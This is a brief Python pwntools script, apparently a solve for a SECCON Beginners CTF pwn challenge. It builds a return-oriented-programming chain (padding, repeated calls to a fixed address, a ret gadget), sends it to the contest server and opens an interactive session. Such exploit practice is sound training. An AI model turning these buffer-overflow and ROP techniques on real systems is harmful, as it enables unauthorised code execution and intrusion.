from pwn import *

context.arch = 'amd64'
elf = ELF('./chall')
rop = ROP(elf)
rop.raw('a'*0x10)
rop.call(0x400861)
rop.call(0x400861)
rop.call(0x400861)
#rop.call(0x400b30)
rop.raw(rop.find_gadget(['ret']))
rop.call(0x400861)
rop.call(0x400861)
print(rop.dump())
print(rop.chain())
#io = process('./chall')
io = remote("bs.quals.beginners.seccon.jp",9001)
#payload = cyclic(40)+p32(0x00400861)
payload = rop.chain()
io.send(payload.decode('ascii'))
io.interactive()
